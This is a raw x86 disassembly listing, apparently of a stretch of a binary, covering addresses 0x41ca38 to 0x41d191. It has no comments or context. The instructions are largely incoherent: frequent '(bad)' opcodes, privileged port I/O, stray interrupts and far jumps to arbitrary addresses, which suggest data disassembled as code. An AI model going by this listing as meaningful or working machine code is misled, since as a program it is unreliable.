  41ca38:	jg     0x41ca87
  41ca3a:	lds    edi,FWORD PTR [edi]
  41ca3c:	or     BYTE PTR [edx],ch
  41ca3e:	adc    BYTE PTR [edi+0x6a3256c],dl
  41ca44:	test   al,0x1c
  41ca46:	hlt    
  41ca47:	aam    0x3
  41ca49:	inc    edi
  41ca4a:	dec    esp
  41ca4b:	mov    BYTE PTR [esi+edi*8+0x57],dl
  41ca4f:	jmp    0x3f13347d
  41ca54:	mov    ecx,fs
  41ca56:	xchg   DWORD PTR [ecx-0x51],ebx
  41ca59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca5a:	or     BYTE PTR [ecx+0x5dc48cd3],al
  41ca60:	mov    eax,ds:0x7d636f
  41ca65:	sbb    DWORD PTR [edx],ebx
  41ca67:	or     al,0x37
  41ca69:	out    0x1f,eax
  41ca6b:	les    esp,FWORD PTR [ebp-0x77ea6d14]
  41ca71:	(bad)  
  41ca72:	int    0xef
  41ca74:	(bad)  
  41ca75:	retf   
  41ca76:	imul   eax,DWORD PTR [ecx-0x7],0x81f7c729
  41ca7d:	hlt    
  41ca7e:	xchg   ecx,eax
  41ca7f:	sub    DWORD PTR [ebx],0x66
  41ca82:	retf   
  41ca83:	mov    BYTE PTR [ebx+0x5de2ffab],cl
  41ca89:	cmp    ebp,DWORD PTR [edi+0x9]
  41ca8c:	inc    edi
  41ca8d:	push   ebp
  41ca8e:	(bad)  
  41ca90:	push   0x328548cd
  41ca95:	aam    0x1c
  41ca97:	jbe    0x41ca30
  41ca99:	mov    ah,0x2
  41ca9b:	sbb    ebp,DWORD PTR [ebx]
  41ca9d:	ficomp DWORD PTR [edx]
  41ca9f:	mov    dh,0x51
  41caa1:	and    cl,ch
  41caa3:	add    eax,0xbf047b59
  41caa8:	pop    edi
  41caa9:	addr16 popa 
  41caab:	int3   
  41caac:	lock imul ebp,esp,0x2
  41cab0:	es inc ecx
  41cab2:	pop    ebx
  41cab3:	jp     0x41caa2
  41cab5:	aad    0x8c
  41cab7:	rol    DWORD PTR [edx+eiz*1+0x2a],cl
  41cabb:	sub    eax,0xc39ba84c
  41cac0:	ss push 0xffffffdc
  41cac3:	pop    ebp
  41cac4:	std    
  41cac5:	jmp    0x87c1:0xf1c2caf1
  41cacc:	ret    
  41cacd:	and    cl,BYTE PTR ds:0xb62bf81a
  41cad3:	out    0xa5,eax
  41cad5:	fistp  DWORD PTR [edx+0x231438d]
  41cadb:	jae    0x41cb13
  41cadd:	adc    eax,0x16a7e8fc
  41cae2:	xchg   ebp,eax
  41cae3:	mov    BYTE PTR [edi+eiz*8+0x5b532297],ch
  41caea:	add    al,0x27
  41caec:	ret    0x2af5
  41caef:	mov    ah,0xb8
  41caf1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caf3:	mov    ds:0xb0f705c5,al
  41caf8:	adc    DWORD PTR [ebp-0x428c902e],edx
  41cafe:	cmp    BYTE PTR ds:0x312b51ac,cl
  41cb04:	mov    ds:0x9568c992,al
  41cb09:	dec    edi
  41cb0a:	add    al,0xb0
  41cb0c:	(bad)  
  41cb0d:	stos   BYTE PTR es:[edi],al
  41cb0e:	fsub   DWORD PTR [edi]
  41cb10:	in     al,dx
  41cb11:	jae    0x41cb07
  41cb13:	call   0x6035:0x5381f817
  41cb1a:	dec    edx
  41cb1b:	mov    ecx,0xab210e6e
  41cb20:	arpl   WORD PTR [edx+0x77cd262d],cx
  41cb26:	(bad)  
  41cb28:	std    
  41cb29:	sahf   
  41cb2a:	enter  0x9760,0x3a
  41cb2e:	rol    DWORD PTR gs:[edx-0x51],cl
  41cb32:	push   edi
  41cb33:	sti    
  41cb34:	pop    eax
  41cb35:	loope  0x41cbad
  41cb37:	mov    eax,ds:0xcf15f4ed
  41cb3c:	ins    BYTE PTR es:[edi],dx
  41cb3d:	adc    eax,0x61ba85d2
  41cb42:	imul   ecx,esi,0x688bd1a3
  41cb48:	push   ecx
  41cb49:	mov    ah,BYTE PTR [edi]
  41cb4b:	repnz or al,0xb9
  41cb4e:	mov    edx,0x93b15d00
  41cb53:	outs   dx,BYTE PTR ds:[esi]
  41cb54:	pop    esp
  41cb55:	fcomi  st,st(0)
  41cb57:	mov    ecx,0xcfc0646d
  41cb5c:	outs   dx,DWORD PTR fs:[esi]
  41cb5e:	push   ebx
  41cb5f:	call   0x1f0b:0xaa20079f
  41cb66:	in     al,0xe1
  41cb68:	jle    0x41cbd6
  41cb6a:	hlt    
  41cb6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb6c:	popa   
  41cb6d:	pushf  
  41cb6e:	cmp    DWORD PTR [esi-0x44952c76],esp
  41cb74:	ror    DWORD PTR [eax],1
  41cb76:	pop    ebx
  41cb77:	push   0x6549e756
  41cb7c:	mov    esi,0x41227cc5
  41cb81:	lea    ebx,[ecx*4+0x18d0f647]
  41cb88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb89:	xor    edi,esp
  41cb8b:	xchg   DWORD PTR [esi],ebx
  41cb8d:	sub    bh,BYTE PTR [ecx]
  41cb8f:	test   BYTE PTR [esi],0x7c
  41cb92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb93:	cmova  eax,esi
  41cb96:	push   0x24fb4a04
  41cb9b:	push   0xe
  41cb9d:	adc    al,BYTE PTR [ecx-0x7d83ec7]
  41cba3:	or     al,0x28
  41cba5:	pop    ecx
  41cba6:	stos   DWORD PTR es:[edi],eax
  41cba7:	adc    ebp,0xffffffc8
  41cbaa:	sub    BYTE PTR [esi+0x23be6ba4],dl
  41cbb0:	add    eax,edi
  41cbb2:	and    al,0xb6
  41cbb4:	inc    edi
  41cbb5:	cmp    BYTE PTR [esi+esi*2],0x58
  41cbb9:	push   ss
  41cbba:	jl     0x41cc3b
  41cbbc:	sbb    eax,0xdd1ed243
  41cbc1:	jnp    0x41cc09
  41cbc3:	inc    ebp
  41cbc4:	ja     0x41cc28
  41cbc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbc7:	pushf  
  41cbc8:	push   ebp
  41cbc9:	add    eax,0x51904eec
  41cbce:	retf   0x4b12
  41cbd1:	(bad)  
  41cbd3:	or     ch,cl
  41cbd5:	imul   edi,DWORD PTR fs:[ebx+0x2c],0x93f39357
  41cbdd:	sub    BYTE PTR [ecx],cl
  41cbdf:	ficom  DWORD PTR [edi+0x56]
  41cbe2:	sbb    DWORD PTR ds:0xce0e9220,edx
  41cbe8:	mov    esp,0x91a62939
  41cbed:	repz (bad) 
  41cbef:	pop    ecx
  41cbf0:	push   ss
  41cbf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbf2:	in     eax,0x92
  41cbf4:	fwait
  41cbf5:	mov    eax,ds:0x856a1989
  41cbfa:	mov    bl,0x47
  41cbfc:	or     DWORD PTR [esi-0x5f],0xffffff8c
  41cc00:	inc    eax
  41cc01:	jecxz  0x41cc29
  41cc03:	cwde   
  41cc04:	mov    ebp,0xce917827
  41cc09:	call   0xe6d:0x7b96e82c
  41cc10:	and    ebp,DWORD PTR [edi*8+0x333712e5]
  41cc17:	xor    al,BYTE PTR ds:0x4c418621
  41cc1d:	into   
  41cc1e:	pop    esi
  41cc1f:	jmp    0xbda3:0x3eba1fc7
  41cc26:	test   al,0x13
  41cc28:	xor    al,dh
  41cc2a:	stc    
  41cc2b:	cli    
  41cc2c:	pop    eax
  41cc2d:	cmp    dl,BYTE PTR [esi-0x74]
  41cc30:	mov    al,ds:0xbd1e29fe
  41cc35:	fwait
  41cc36:	xchg   ebx,eax
  41cc37:	int3   
  41cc38:	(bad)  
  41cc39:	sub    eax,esp
  41cc3b:	shl    DWORD PTR [edi+0x3c],1
  41cc3e:	ja     0x41cc19
  41cc40:	add    al,0xc2
  41cc42:	cmp    eax,0x16a6a8a1
  41cc47:	xor    ebx,esi
  41cc49:	add    eax,0x9aef4177
  41cc4e:	aaa    
  41cc4f:	and    ebp,edx
  41cc51:	push   edi
  41cc52:	jle    0x41cc2a
  41cc54:	sbb    ecx,edi
  41cc56:	jo     0x41cc37
  41cc58:	jmp    0x41ccd5
  41cc5a:	mov    ch,0x77
  41cc5c:	dec    esi
  41cc5d:	xor    eax,0x994a8b7f
  41cc62:	lods   eax,DWORD PTR ds:[esi]
  41cc63:	mov    dl,0x7b
  41cc65:	mov    BYTE PTR [ecx],0xa0
  41cc68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc69:	and    eax,0x58e5eebf
  41cc6e:	push   ecx
  41cc6f:	mov    esp,0x15c897db
  41cc74:	aas    
  41cc75:	sti    
  41cc76:	(bad)  
  41cc78:	push   eax
  41cc79:	call   0x2426b5a8
  41cc7e:	pop    ebp
  41cc7f:	cdq    
  41cc80:	xor    ah,al
  41cc82:	and    al,BYTE PTR [edx-0x497e0496]
  41cc88:	rcr    BYTE PTR [ebx],1
  41cc8a:	nop
  41cc8b:	loop   0x41ccb2
  41cc8d:	scas   al,BYTE PTR es:[edi]
  41cc8e:	stc    
  41cc8f:	and    BYTE PTR [edx+eax*4+0x584119ac],bh
  41cc96:	xchg   edx,eax
  41cc97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc98:	xchg   edx,eax
  41cc99:	popa   
  41cc9a:	push   esp
  41cc9b:	mov    ebp,eax
  41cc9d:	mov    al,ds:0x78accbd
  41cca2:	xchg   ecx,eax
  41cca3:	xchg   edx,eax
  41cca4:	retf   0x4288
  41cca7:	ficom  DWORD PTR gs:[edx]
  41ccaa:	fwait
  41ccab:	xchg   edx,eax
  41ccac:	jg     0x41cc77
  41ccae:	mov    al,0x66
  41ccb0:	jo     0x41ccdb
  41ccb2:	mov    al,ds:0xb16efb23
  41ccb7:	push   0xe7e923a9
  41ccbc:	ins    BYTE PTR es:[edi],dx
  41ccbd:	pop    eax
  41ccbe:	mov    eax,0xcc778335
  41ccc3:	loop   0x41ccdc
  41ccc5:	leave  
  41ccc6:	dec    esp
  41ccc7:	mov    ds,WORD PTR [ebx]
  41ccc9:	adc    al,0xd9
  41cccb:	xor    esi,DWORD PTR [eax-0x62]
  41ccce:	mov    edx,DWORD PTR [ecx-0x3b]
  41ccd1:	pop    edi
  41ccd2:	sbb    edi,0xffffff9c
  41ccd5:	inc    edx
  41ccd6:	jnp    0x41cc6b
  41ccd8:	mov    edx,ebx
  41ccda:	int    0xb8
  41ccdc:	mov    ah,0x8d
  41ccde:	inc    eax
  41ccdf:	pop    ss
  41cce0:	sub    eax,0x5269de74
  41cce5:	sbb    DWORD PTR [ebx+0x2a],ecx
  41cce8:	clc    
  41cce9:	fst    DWORD PTR [esi-0x61]
  41ccec:	imul   bh
  41ccee:	lods   al,BYTE PTR ds:[esi]
  41ccef:	in     al,dx
  41ccf0:	retf   0x7d3e
  41ccf3:	shl    edx,1
  41ccf5:	jge    0x41cd66
  41ccf7:	sbb    esi,edi
  41ccf9:	dec    ecx
  41ccfa:	outs   dx,BYTE PTR ds:[esi]
  41ccfb:	mov    ecx,eax
  41ccfd:	fadd   st(6),st
  41ccff:	cli    
  41cd00:	xchg   BYTE PTR [ebp+edi*8+0x37],ch
  41cd04:	xor    BYTE PTR [edi-0x57],dl
  41cd07:	aas    
  41cd08:	jne    0x41cd6b
  41cd0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd0b:	push   edi
  41cd0c:	mov    ds:0xe50ae3cd,eax
  41cd11:	dec    ecx
  41cd12:	and    al,BYTE PTR [esi-0x14f089cc]
  41cd18:	int3   
  41cd19:	(bad)  
  41cd1b:	fnstcw WORD PTR [ebp+0x61b7c999]
  41cd21:	pop    ebx
  41cd22:	xor    bh,ch
  41cd24:	sar    BYTE PTR [ebx],1
  41cd26:	and    DWORD PTR [ebp+0x1d],esi
  41cd29:	fld    QWORD PTR [ebx-0x6f]
  41cd2c:	mov    DWORD PTR [esi],ebp
  41cd2e:	dec    ecx
  41cd2f:	push   ss
  41cd30:	dec    esi
  41cd31:	xchg   BYTE PTR [edx-0x5a09cb19],bl
  41cd37:	pushf  
  41cd38:	mov    esi,0x91b760fd
  41cd3d:	lods   al,BYTE PTR ds:[esi]
  41cd3e:	mov    BYTE PTR [eax-0x1c],dl
  41cd41:	xor    eax,0x21b0d359
  41cd46:	push   ebp
  41cd47:	ins    BYTE PTR es:[edi],dx
  41cd48:	or     al,0x40
  41cd4a:	(bad)  
  41cd4b:	ret    
  41cd4c:	inc    esp
  41cd4d:	loop   0x41cd5d
  41cd4f:	sub    DWORD PTR [esp+ecx*8-0x5d],ecx
  41cd53:	call   esi
  41cd55:	and    al,0x22
  41cd57:	xchg   ebp,eax
  41cd58:	xor    DWORD PTR [esi+0x6b],0xffffff95
  41cd5c:	dec    ebx
  41cd5d:	pop    eax
  41cd5e:	sti    
  41cd5f:	ins    BYTE PTR es:[edi],dx
  41cd60:	adc    ebp,DWORD PTR [esi+edi*1+0xbe0eae7]
  41cd67:	(bad)  
  41cd68:	xchg   ecx,eax
  41cd69:	je     0x41cd57
  41cd6b:	sub    dh,BYTE PTR [ebx+0x3e]
  41cd6e:	sub    BYTE PTR [ebp+0x19],bl
  41cd71:	push   edx
  41cd72:	les    edi,FWORD PTR [ecx-0x635399db]
  41cd78:	leave  
  41cd79:	setbe  dl
  41cd7c:	cmp    esp,DWORD PTR [edx]
  41cd7e:	xor    eax,0x1878afcd
  41cd83:	and    eax,0xc5b8ad24
  41cd88:	aaa    
  41cd89:	mov    dh,0xd5
  41cd8b:	add    al,0xb
  41cd8d:	shl    DWORD PTR [ecx-0x195863c9],0x36
  41cd94:	mov    esi,0xb0a17697
  41cd99:	mov    al,ds:0x4e55e149
  41cd9e:	jl     0x41cdd7
  41cda0:	mov    esp,0xcf9b4372
  41cda5:	xchg   BYTE PTR [ecx+ebx*4+0x1c],dh
  41cda9:	jb     0x41ce04
  41cdab:	dec    ecx
  41cdac:	outs   dx,BYTE PTR ds:[esi]
  41cdad:	sbb    al,0x92
  41cdaf:	mov    ss,WORD PTR [ecx-0x6d]
  41cdb2:	std    
  41cdb3:	push   ebx
  41cdb4:	xor    eax,0x21e4fc8a
  41cdb9:	(bad)  
  41cdba:	repnz sub DWORD PTR [ebx],0x5c4505a1
  41cdc1:	loop   0x41ce00
  41cdc3:	sar    DWORD PTR ds:0x56f06f5a,0x69
  41cdca:	dec    ebx
  41cdcb:	test   DWORD PTR [edi-0x785020d9],ecx
  41cdd1:	or     DWORD PTR [esi+0x67],0xffffffdd
  41cdd5:	popw   ds
  41cdd7:	or     DWORD PTR ds:0xf38f1764,esp
  41cddd:	dec    ecx
  41cdde:	jecxz  0x41cdca
  41cde0:	pop    ebp
  41cde1:	lods   eax,DWORD PTR ds:[esi]
  41cde2:	inc    ebx
  41cde3:	mov    ah,0x68
  41cde5:	imul   eax,ecx,0x78e130
  41cdeb:	and    DWORD PTR [ebx],0xfffffff6
  41cdee:	or     esp,DWORD PTR [edx-0x123614ba]
  41cdf4:	pop    ecx
  41cdf5:	and    esp,DWORD PTR [ebp-0x69a96f1d]
  41cdfb:	ja     0x41ce28
  41cdfd:	jno    0x41ce3f
  41cdff:	mov    esp,0x5012dc01
  41ce04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce05:	xchg   edi,eax
  41ce06:	cdq    
  41ce07:	inc    eax
  41ce08:	mov    ecx,0xf480b27d
  41ce0d:	int3   
  41ce0e:	pop    ecx
  41ce0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce10:	mov    dl,bl
  41ce12:	xchg   esp,eax
  41ce14:	or     DWORD PTR [edi+edi*1],esi
  41ce17:	add    cl,ah
  41ce19:	ficom  WORD PTR [ebp+0x69]
  41ce1c:	out    dx,al
  41ce1d:	mov    esp,0xd1cb4853
  41ce22:	sub    al,0xee
  41ce24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce25:	mov    dh,0xc9
  41ce27:	push   cs
  41ce28:	or     al,ch
  41ce2a:	out    0x95,eax
  41ce2c:	les    esp,FWORD PTR [eax+0x4ff3b759]
  41ce32:	ds dec esp
  41ce34:	dec    esp
  41ce35:	jbe    0x41ce5f
  41ce37:	mov    bh,0x3b
  41ce39:	mov    gs,WORD PTR [ebp+esi*2+0x3f443074]
  41ce40:	lea    esp,[edx-0x347122e]
  41ce46:	pop    esi
  41ce47:	add    ebp,ebx
  41ce49:	into   
  41ce4a:	pop    ebp
  41ce4b:	xchg   bp,ax
  41ce4d:	jp     0x41ce9a
  41ce4f:	xchg   esi,eax
  41ce50:	sbb    DWORD PTR [eax+0x41],esi
  41ce53:	int    0xc3
  41ce55:	les    ebp,FWORD PTR [ebx+0x355ba3ce]
  41ce5b:	fadd   st(0),st
  41ce5d:	sbb    edi,eax
  41ce5f:	lods   al,BYTE PTR ds:[esi]
  41ce60:	(bad)  
  41ce61:	scas   al,BYTE PTR es:[edi]
  41ce62:	out    dx,al
  41ce63:	(bad)  
  41ce64:	scas   eax,DWORD PTR es:[edi]
  41ce65:	in     al,dx
  41ce66:	adc    BYTE PTR [ebx],0x77
  41ce69:	fwait
  41ce6a:	sbb    DWORD PTR [edi],ecx
  41ce6c:	mov    edi,esp
  41ce6e:	fst    QWORD PTR [ebp+0x43]
  41ce71:	jmp    0x88d75480
  41ce76:	outs   dx,DWORD PTR ds:[esi]
  41ce77:	aas    
  41ce78:	dec    edx
  41ce79:	retf   0xc416
  41ce7c:	test   edi,edi
  41ce7e:	push   0x39
  41ce80:	push   esp
  41ce81:	jae    0x41cf02
  41ce83:	xchg   ecx,eax
  41ce84:	shl    DWORD PTR [edx],1
  41ce86:	setb   BYTE PTR [ebx-0x13]
  41ce8a:	(bad)  
  41ce8b:	enter  0xcef9,0xe9
  41ce8f:	mov    WORD PTR [edx-0x76],es
  41ce92:	ror    DWORD PTR es:[edi-0x284cd971],cl
  41ce99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce9a:	add    BYTE PTR [edx+0x1a],al
  41ce9d:	mov    ebp,0x86044d2a
  41cea2:	rcl    DWORD PTR ds:0xdb1b8755,0x13
  41cea9:	retf   0xf5be
  41ceac:	adc    ah,bh
  41ceae:	and    al,0x27
  41ceb0:	loop   0x41cf2c
  41ceb2:	pop    ss
  41ceb3:	fwait
  41ceb4:	addr16 (bad) 
  41ceb6:	(bad)  
  41ceb7:	jmp    0x41ce3d
  41ceb9:	rcr    DWORD PTR [ecx-0x28f7a2e6],1
  41cebf:	pop    ss
  41cec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cec1:	xchg   esp,eax
  41cec2:	fistp  WORD PTR [ebx-0x9e24123]
  41cec8:	sbb    al,0x75
  41ceca:	ds cld 
  41cecc:	out    0x93,eax
  41cece:	sbb    edi,DWORD PTR [ebx]
  41ced0:	pop    es
  41ced1:	pusha  
  41ced2:	(bad)  
  41ced3:	xchg   edx,eax
  41ced4:	bound  ebp,QWORD PTR [edx-0x5ce1f88c]
  41ceda:	dec    eax
  41cedb:	daa    
  41cedc:	leave  
  41cedd:	sbb    al,0x94
  41cedf:	inc    DWORD PTR [esp+edi*4-0x16]
  41cee3:	ins    DWORD PTR es:[edi],dx
  41cee4:	mov    edx,DWORD PTR [edx+0x60ca6c82]
  41ceea:	mov    dl,0x38
  41ceec:	je     0x41ce86
  41ceee:	dec    esi
  41ceef:	xchg   edx,eax
  41cef0:	mov    eax,ds:0x1d727149
  41cef5:	jns    0x41ce9b
  41cef7:	add    eax,DWORD PTR [eax+0x21daca28]
  41cefd:	arpl   WORD PTR ds:0xfc1a0bff,di
  41cf03:	jnp    0x41ce8d
  41cf05:	hlt    
  41cf06:	adc    BYTE PTR [ebp+0x20],dl
  41cf09:	pop    ecx
  41cf0a:	dec    dl
  41cf0c:	call   0x19fc:0x416d043a
  41cf13:	mov    edi,0x946e2608
  41cf18:	add    DWORD PTR [eax-0x37],edi
  41cf1b:	jno    0x41cee9
  41cf1d:	enter  0xbc8a,0x9f
  41cf21:	adc    edi,DWORD PTR [edi+0x754154e]
  41cf27:	clc    
  41cf28:	clc    
  41cf29:	mov    ecx,0x5474df26
  41cf2e:	ins    BYTE PTR es:[edi],dx
  41cf2f:	shl    DWORD PTR [edx+0x2761efd4],cl
  41cf35:	jle    0x41cec1
  41cf37:	push   ss
  41cf38:	outs   dx,BYTE PTR ds:[esi]
  41cf39:	or     bl,BYTE PTR [eax+0x1c]
  41cf3c:	aas    
  41cf3d:	jne    0x41cfb1
  41cf3f:	fisubr WORD PTR [eax]
  41cf41:	push   ss
  41cf42:	cmp    BYTE PTR [esi+0x56fa3abb],cl
  41cf48:	push   0xffffff87
  41cf4a:	int    0x1d
  41cf4c:	setno  BYTE PTR [eax-0x59]
  41cf50:	data16 mov ah,0x13
  41cf53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf54:	mov    cl,0x5d
  41cf56:	xor    dx,di
  41cf59:	inc    edi
  41cf5a:	mov    ecx,ebx
  41cf5c:	lds    ebp,FWORD PTR ds:0x16ac5baa
  41cf62:	push   ds
  41cf63:	cmp    edx,DWORD PTR [ebp+0x6e6d43a6]
  41cf69:	mov    esp,0xa698ea7a
  41cf6e:	(bad)  
  41cf6f:	mov    edx,0x9bd87af
  41cf74:	ffreep st(5)
  41cf76:	jo     0x41cf8f
  41cf78:	push   eax
  41cf79:	mov    esp,0xe6f54958
  41cf7e:	or     eax,0x8631f58e
  41cf83:	push   es
  41cf84:	sbb    al,0xef
  41cf86:	and    al,0x5
  41cf88:	mov    ah,0x25
  41cf8a:	mov    bl,dh
  41cf8c:	retf   0x4492
  41cf8f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41cf91:	mov    BYTE PTR [ecx+0xa],dh
  41cf94:	jmp    0x41cf76
  41cf96:	push   edi
  41cf97:	mov    ah,0xfe
  41cf99:	pusha  
  41cf9a:	sub    dh,ch
  41cf9c:	cmp    DWORD PTR [ecx+0x27700054],0x58
  41cfa3:	or     BYTE PTR [ebx-0x5a],dh
  41cfa6:	cld    
  41cfa7:	imul   edx,DWORD PTR [edx+0x3aa29bf],0xffffffbd
  41cfae:	pop    ebp
  41cfaf:	add    BYTE PTR [esp+edi*4],0x1d
  41cfb3:	jge    0x41cf3c
  41cfb5:	sbb    cl,BYTE PTR [ebp+0x6c]
  41cfb8:	sti    
  41cfb9:	jno    0x41cf82
  41cfbb:	mov    ah,BYTE PTR [ebp+0x6458a092]
  41cfc1:	mov    bh,0x90
  41cfc3:	in     al,dx
  41cfc4:	add    ebx,DWORD PTR [edi+0x1c346d1c]
  41cfca:	test   eax,0xfa2e85d2
  41cfcf:	sub    DWORD PTR [ebx+0x3d],eax
  41cfd2:	out    dx,al
  41cfd3:	adc    bl,BYTE PTR [ebp-0x287eb6f3]
  41cfd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfda:	and    dh,BYTE PTR [ebx]
  41cfdc:	xchg   BYTE PTR [ecx-0x4f939183],dh
  41cfe2:	enter  0xf83e,0xa
  41cfe6:	push   ebp
  41cfe7:	mov    edi,0xb0fd69f2
  41cfec:	daa    
  41cfed:	shr    BYTE PTR [eax],cl
  41cfef:	popf   
  41cff0:	sbb    al,0x80
  41cff2:	in     eax,0x8f
  41cff4:	pop    edi
  41cff5:	shl    DWORD PTR [eax-0x19],1
  41cff8:	jbe    0x41cfa2
  41cffa:	mov    ebx,0xa0c1db51
  41cfff:	xor    eax,0xf0442399
  41d004:	jle    0x41cfbe
  41d006:	retf   
  41d007:	push   edx
  41d008:	jne    0x41d067
  41d00a:	add    BYTE PTR [eax+0x180b8900],bh
  41d010:	or     bh,BYTE PTR [esi-0x77]
  41d013:	xor    bl,cl
  41d015:	xchg   ecx,eax
  41d016:	mov    bh,0xf5
  41d018:	daa    
  41d019:	jg     0x41d06c
  41d01b:	mov    edi,DWORD PTR [edx-0x46a932a5]
  41d021:	cmp    BYTE PTR [ecx+0x5c8bc396],al
  41d027:	cli    
  41d028:	std    
  41d029:	jnp    0x41cfae
  41d02b:	xor    edx,DWORD PTR [eax+0x26]
  41d02e:	jg     0x41d0af
  41d030:	sar    dl,0xb7
  41d033:	xor    eax,0xc999010e
  41d038:	hlt    
  41d039:	out    0xe5,eax
  41d03b:	or     eax,0x16324d77
  41d040:	cmp    eax,0xc0376f81
  41d045:	lods   eax,DWORD PTR ds:[esi]
  41d046:	inc    edi
  41d047:	mov    edx,0x9a567644
  41d04c:	mov    bl,0x84
  41d04e:	jo     0x388a2022
  41d054:	or     eax,0x3631bf71
  41d059:	pusha  
  41d05a:	icebp  
  41d05b:	sbb    al,0x69
  41d05d:	sub    BYTE PTR [ecx-0x556d59bc],bh
  41d063:	int    0x7b
  41d065:	outs   dx,BYTE PTR ds:[esi]
  41d066:	leave  
  41d067:	jae    0x41d0ad
  41d069:	push   edx
  41d06a:	pop    ss
  41d06b:	and    al,0xd7
  41d06d:	xchg   edi,eax
  41d06e:	call   0xe06a:0xbda18823
  41d075:	int3   
  41d076:	pop    ebp
  41d077:	mov    al,0xc7
  41d079:	imul   DWORD PTR [ebp+0x7]
  41d07c:	cmp    edi,DWORD PTR [edi-0x3c]
  41d07f:	xor    BYTE PTR [edi-0x44],0x6e
  41d083:	mov    al,0x3a
  41d085:	mov    WORD PTR [edi+0x76],?
  41d088:	or     al,0xc6
  41d08a:	push   ss
  41d08b:	dec    esi
  41d08c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d08d:	scas   al,BYTE PTR es:[edi]
  41d08e:	pop    es
  41d08f:	sahf   
  41d090:	mov    ecx,0x7b55f12a
  41d095:	jo     0x41d0f6
  41d097:	call   0x9d20:0xf7c39250
  41d09e:	push   ds
  41d09f:	aas    
  41d0a0:	fs jmp 0x41d11c
  41d0a3:	icebp  
  41d0a4:	jb     0x41d086
  41d0a6:	adc    eax,0xa4fc0f69
  41d0ab:	xchg   BYTE PTR [ebx+0x5b062516],dl
  41d0b1:	into   
  41d0b2:	jle    0x41d12d
  41d0b4:	rol    al,1
  41d0b6:	jl     0x41d0b5
  41d0b8:	push   ebp
  41d0b9:	jo     0x41d0ec
  41d0bb:	enter  0xa242,0xe
  41d0bf:	add    al,0x7
  41d0c1:	repnz in eax,dx
  41d0c3:	push   edi
  41d0c4:	dec    ebp
  41d0c5:	adc    esp,ebp
  41d0c7:	cwde   
  41d0c8:	dec    edx
  41d0c9:	cwde   
  41d0ca:	cwde   
  41d0cb:	xlat   BYTE PTR ds:[ebx]
  41d0cc:	into   
  41d0cd:	mov    ecx,DWORD PTR [edx]
  41d0cf:	cmp    BYTE PTR [edx-0x69],bh
  41d0d2:	and    ch,BYTE PTR ds:0x393f98f6
  41d0d8:	aaa    
  41d0d9:	ins    BYTE PTR es:[edi],dx
  41d0da:	mov    esi,0x6db1e2ff
  41d0df:	adc    DWORD PTR [edi-0xa],0x4e628cb4
  41d0e6:	mov    eax,ds:0xfa6ff2fb
  41d0eb:	inc    edi
  41d0ec:	mov    edi,0x8c31b906
  41d0f1:	xchg   ebx,eax
  41d0f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0f3:	push   ds
  41d0f4:	cmp    al,0xe7
  41d0f6:	jmp    0x35985c85
  41d0fb:	mov    edx,0x38cb2dd2
  41d100:	daa    
  41d101:	popf   
  41d102:	xchg   DWORD PTR [ecx+edx*2+0x187e4c15],esi
  41d109:	mov    ebx,ecx
  41d10b:	repz js 0x41d139
  41d10e:	cmp    al,0xef
  41d110:	pop    eax
  41d111:	outs   dx,BYTE PTR ds:[esi]
  41d112:	imul   ebp,DWORD PTR [ebp+ecx*1-0x27],0xffffff9e
  41d117:	ins    DWORD PTR es:[edi],dx
  41d118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d119:	mov    ecx,0x1d930eb8
  41d11e:	cmp    esp,esp
  41d120:	mov    ebx,0x8a520303
  41d125:	jecxz  0x41d1a5
  41d127:	add    DWORD PTR [ecx-0x3d],edx
  41d12a:	lock inc eax
  41d12c:	lods   al,BYTE PTR ds:[esi]
  41d12d:	test   al,0x7f
  41d12f:	test   edx,edi
  41d131:	sub    eax,0x9c0a4f42
  41d136:	in     eax,0x39
  41d138:	scas   eax,DWORD PTR es:[edi]
  41d139:	int    0x50
  41d13b:	or     BYTE PTR [eax+0x6c20c7f0],ah
  41d141:	adc    al,0x3c
  41d143:	retf   0x446d
  41d146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d147:	add    BYTE PTR [edi],0xa1
  41d14a:	fsubrp st(2),st
  41d14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d14d:	dec    esi
  41d14e:	cs cli 
  41d150:	ss jecxz 0x41d1d0
  41d153:	inc    ebp
  41d154:	cmp    esi,DWORD PTR [edi+0x3c]
  41d157:	add    eax,0xeaf5b141
  41d15c:	xlat   BYTE PTR ds:[ebx]
  41d15d:	jmp    0x50c4858a
  41d162:	loope  0x41d127
  41d164:	rcl    bl,1
  41d166:	aad    0x9a
  41d168:	dec    ebp
  41d169:	lods   eax,DWORD PTR ds:[esi]
  41d16a:	inc    esp
  41d16b:	jbe    0x41d0ff
  41d16d:	test   DWORD PTR [edx+0x2d43a4c8],0x6d2627bc
  41d177:	jmp    0x41d1ce
  41d179:	les    esp,FWORD PTR [esi+eiz*2-0x3c6d96d3]
  41d180:	pushf  
  41d181:	aas    
  41d182:	or     ch,BYTE PTR [eax-0x114fba39]
  41d188:	neg    DWORD PTR [esi+0x6bc8b2e1]
  41d18e:	xchg   edi,eax
  41d18f:	ja     0x41d1c8
  41d191:	sbb    DWORD PTR [ebx+0x47fc702],ebp
